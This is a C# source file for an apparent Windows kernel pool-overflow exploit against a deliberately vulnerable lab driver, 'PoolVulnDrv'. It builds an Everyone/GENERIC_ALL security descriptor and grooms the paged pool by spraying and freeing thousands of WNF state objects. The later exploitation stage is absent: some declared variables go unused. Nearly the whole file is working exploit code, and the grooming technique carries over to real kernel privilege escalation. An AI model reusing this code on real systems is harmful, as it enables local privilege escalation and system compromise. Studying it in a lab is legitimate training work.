using System;
using System.Runtime.InteropServices;
using System.Text;
using SharpWnfPoolOverflow.Interop;

namespace SharpWnfPoolOverflow
{
    internal class SharpWnfPoolOverflow
    {

        static readonly ulong[] g_StateNames = new ulong[10000];
        private static IntPtr GetWorldAllowedSecurityDescriptor()
        {
            IntPtr pDacl;
            IntPtr pAce;
            var nDaclOffset = Marshal.SizeOf(typeof(SECURITY_DESCRIPTOR));
            var nSidStartOffset = Marshal.OffsetOf(typeof(ACCESS_ALLOWED_ACE), "SidStart").ToInt32();
            var everyoneSid = new byte[] { 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0 }; // S-1-1-0
            var nBufferLength = nDaclOffset + Marshal.SizeOf(typeof(ACL)) + nSidStartOffset + everyoneSid.Length;
            var sd = new SECURITY_DESCRIPTOR
            {
                Revision = 1,
                Control = SECURITY_DESCRIPTOR_CONTROL.SE_DACL_PRESENT | SECURITY_DESCRIPTOR_CONTROL.SE_SELF_RELATIVE,
                Dacl = nDaclOffset
            };
            var ace = new ACCESS_ALLOWED_ACE
            {
                Header = new ACE_HEADER
                {
                    AceType = ACE_TYPE.ACCESS_ALLOWED,
                    AceFlags = ACE_FLAGS.NONE,
                    AceSize = (short)(nSidStartOffset + everyoneSid.Length)
                },
                Mask = ACCESS_MASK.GENERIC_ALL
            };
            var aclHeader = new ACL
            {
                AclRevision = ACL_REVISION.ACL_REVISION,
                Sbz1 = 0,
                AclSize = (short)(Marshal.SizeOf(typeof(ACL)) + nSidStartOffset + everyoneSid.Length),
                AceCount = 1,
                Sbz2 = 0
            };
            var pSecurityDescriptor = Marshal.AllocHGlobal(nBufferLength);

            if (Environment.Is64BitProcess)
            {
                pDacl = new IntPtr(pSecurityDescriptor.ToInt64() + nDaclOffset);
                pAce = new IntPtr(pDacl.ToInt64() + Marshal.SizeOf(typeof(ACL)));
            }
            else
            {
                pDacl = new IntPtr(pSecurityDescriptor.ToInt32() + nDaclOffset);
                pAce = new IntPtr(pDacl.ToInt32() + Marshal.SizeOf(typeof(ACL)));
            }

            Marshal.StructureToPtr(sd, pSecurityDescriptor, true);
            Marshal.StructureToPtr(aclHeader, pDacl, true);
            Marshal.StructureToPtr(ace, pAce, true);

            for (var oft = 0; oft < everyoneSid.Length; oft++)
                Marshal.WriteByte(pAce, nSidStartOffset + oft, everyoneSid[oft]);

            return pSecurityDescriptor;
        }

        static bool AllocateWnfStateData(ulong stateName, byte[] data)
        {
            IntPtr buffer = Marshal.AllocHGlobal(data.Length);
            Marshal.Copy(data, 0, buffer, data.Length);

            int ntstatus = NativeMethods.NtUpdateWnfStateData(
                in stateName,
                buffer,
                data.Length,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0);
            Marshal.FreeHGlobal(buffer);

            return ntstatus == Win32Consts.STATUS_SUCCESS;
        }

        static ulong AllocateWnfNameInstance(IntPtr pSecurityDescriptor)
        {

            int ntstatus = NativeMethods.NtCreateWnfStateName(
                out ulong stateName,
                WNF_STATE_NAME_LIFETIME.Temporary,
                WNF_DATA_SCOPE.Machine,
                false,
                IntPtr.Zero,
                0x1000,
                pSecurityDescriptor);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("\n[-] Failed to NtCreateWnfStateName (ntstatus = 0x{0}).\n", ntstatus.ToString("X8"));

                return 0UL;
            }

            return stateName;
        }

        static bool FreeWnfNameInstance(ulong stateName)
        {
            return NativeMethods.NtDeleteWnfStateName(in stateName) == Win32Consts.STATUS_SUCCESS;
        }
        static bool FreeWnfStateData(ulong stateName)
        {
            return NativeMethods.NtDeleteWnfStateData(in stateName, IntPtr.Zero) == Win32Consts.STATUS_SUCCESS;
        }
        public static IntPtr GetDeviceHandle(string devicePath)
        {
            return NativeMethods.CreateFile(
                devicePath,
                ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                0,
                IntPtr.Zero,
                CREATION_DISPOSITION.OPEN_EXISTING,
                0,
                IntPtr.Zero);
        }

        static void SprayWnfObject()
        {
            IntPtr pSecurityDescriptor;
            var inputData = Encoding.ASCII.GetBytes(new string('A', 0xA0));

            Console.WriteLine("[>] Spraying paged pool with WNF objects.");

            pSecurityDescriptor = GetWorldAllowedSecurityDescriptor();

            if (pSecurityDescriptor == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get security descriptor.");

                return;
            }

            for (var count = 0; count < g_StateNames.Length; count++)
                g_StateNames[count] = AllocateWnfNameInstance(pSecurityDescriptor);

            for (var count = 1; count < g_StateNames.Length; count += 2)
            {
                if (FreeWnfNameInstance(g_StateNames[count]))
                    g_StateNames[count] = 0UL;

                AllocateWnfStateData(g_StateNames[count - 1], inputData);
            }

            for (var count = 0; count < g_StateNames.Length; count += 4)
            {
                FreeWnfStateData(g_StateNames[count]);

                if (FreeWnfNameInstance(g_StateNames[count]))
                    g_StateNames[count] = 0UL;
            }

            Marshal.FreeHGlobal(pSecurityDescriptor);

            Console.WriteLine("[*] Pool Spraying is compreleted.");
        }

        static void Main(string[] args)
        {
            int error;
            bool success;
            ulong stateNameForPrimitive;
            IntPtr pKthread;
            bool existWnfObject = false;
            string devicePath = "\\??\\PoolVulnDrv";

            IntPtr hDevice = GetDeviceHandle(devicePath);

            if (hDevice == Win32Consts.INVALID_HANDLE_VALUE)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open {0} (error = {1}).", devicePath, error);

                return;
            }

            SprayWnfObject();
            NativeMethods.CloseHandle(hDevice);
        }
    }
}
